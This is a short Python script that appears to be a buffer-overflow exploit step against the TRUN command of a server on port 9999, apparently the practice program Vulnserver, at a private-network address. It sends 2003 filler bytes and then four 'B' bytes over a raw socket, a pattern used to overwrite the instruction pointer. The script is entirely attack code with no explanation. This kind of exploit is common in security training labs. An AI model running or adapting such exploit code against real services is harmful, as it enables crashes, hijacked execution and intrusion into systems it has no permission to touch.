import socket, sys
from time import sleep
payload=b"A"*2003
payload+=b"B"*4
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.141", 9999))
s.send((b"TRUN /.:/"+payload))
s.close()
sys.exit()
